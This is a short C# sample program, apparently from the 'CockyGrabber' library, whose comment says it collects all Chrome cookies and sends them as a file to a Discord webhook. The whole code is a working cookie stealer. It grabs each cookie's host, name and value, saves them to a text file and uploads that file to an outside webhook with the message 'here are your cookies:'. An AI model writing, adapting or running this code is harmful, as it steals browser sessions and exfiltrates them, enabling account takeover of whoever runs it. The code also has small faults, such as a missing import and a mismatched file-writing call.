using CockyGrabber;
using CockyGrabber.Grabbers;
using System.IO;
using System.Linq;

using Discord.Webhook;

namespace CockyGrabberTest
{
    // This Program collects all Chrome Cookies and sends them as a file to a discord webhook
    // (This Example uses the Discord.Net library)
    class Program
    {
        private const string WebhookUrl = "YOUR WEBHOOK URL HERE";
        static void Main(string[] args)
        {
            ChromeGrabber g = new ChromeGrabber(); // Create Grabber
            StringBuilder cookies = new StringBuilder();

            g.GetCookies().ToList().ForEach(delegate (Blink.Cookie c) // For every grabbed cookie:
            {
                cookies.AppendLine($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
            });

            File.WriteAllLines("./cookies_save.txt", cookies.ToString()); // Save cookies in cookies_save.txt
            DiscordWebhookClient webhookClient = new DiscordWebhookClient(WebhookUrl); // Create Discord.NET DiscordWebhook
            webhookClient.SendFileAsync("./cookies_save.txt", "here are your cookies:").Wait(); // Send the file including the cookies to discord webhook and wait until the message sent
        }
    }
}
